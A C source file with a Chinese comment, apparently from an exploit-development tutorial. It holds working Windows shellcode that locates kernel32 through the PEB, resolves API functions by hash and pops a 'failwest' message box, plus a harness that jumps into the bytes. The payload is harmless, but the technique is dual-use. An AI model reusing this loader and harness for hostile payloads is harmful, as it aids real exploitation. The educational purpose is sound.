#include <string.h>
char popup_general[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
 
 /*
上面这段机器码的作用仍然是弹出一个消息框显示“failwest”。用的方法大概如下：通过FS[0]定位TEB，通过TEB找到PEB，进而找到PE的导入导出表，再定位kerner32.dll的位置，顺藤摸瓜定位到LoadLibraryA，之后就是康庄大道了 ……
 
关于这段shellcode的细节分析么，呵呵，参看《0day安全》吧。我要说的是我在开发并调试这段shellcode的时候，总共用了5天时间（我的汇编基础比较差），之后在各种漏洞场景下实验并改进，最终得出的这段168字节的代码是比较通用和稳定的，我经常用它作为验证漏洞是否可以被exploit的POC （proof of concept）代码。
 
由于shellcode往往是在很“恶劣”的环境下被加载的，要想调试这些机器码得动动脑筋才行。我这里给出一个测试和调试shellcode的样例代码：
char shellcode[]="\x66\x81\xEC\x40\x04\x33\xDB……"; // 欲调试的16进制机器码"
 */
void main()
{
unsigned char MachineCode[256]="";
strncpy((char*)MachineCode, popup_general,256);
__asm
{
lea eax, MachineCode
push eax
ret
}
}